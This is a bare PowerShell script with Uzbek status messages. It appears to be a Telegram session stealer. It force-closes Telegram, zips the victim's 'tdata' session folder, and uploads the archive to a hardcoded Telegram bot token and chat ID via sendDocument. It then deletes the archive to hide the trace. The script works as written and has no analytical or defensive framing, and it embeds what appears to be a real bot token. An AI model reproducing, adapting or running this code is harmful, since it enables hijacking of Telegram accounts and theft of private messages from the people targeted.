$token = "8649684929:AAGUPmSFkh3tLV6OkveTTX3nuIc4rCNjs_A"
$chatId = "6190772023"

$user = $env:USERNAME
$tdata = "$env:APPDATA\Telegram Desktop\tdata"
$zip = "$env:TEMP\tdata_$user.zip"

Stop-Process -Name "Telegram" -Force -ErrorAction SilentlyContinue

if (Test-Path $tdata) {
    try {
        if (Test-Path $zip) { Remove-Item $zip -Force }
        
        Add-Type -A System.IO.Compression.FileSystem
        [System.IO.Compression.ZipFile]::CreateFromDirectory($tdata, $zip)
        
        $url = "https://api.telegram.org/bot$token/sendDocument"
        $postData = @{ chat_id = $chatId; document = Get-Item $zip }
        Invoke-RestMethod -Uri $url -Method Post -Form $postData
        
        Remove-Item $zip -Force
        Write-Host "Tayyor! Botni tekshir."
    } catch {
        Write-Host "Xatolik: $_"
    }
} else {
    Write-Host "tdata topilmadi!"
}
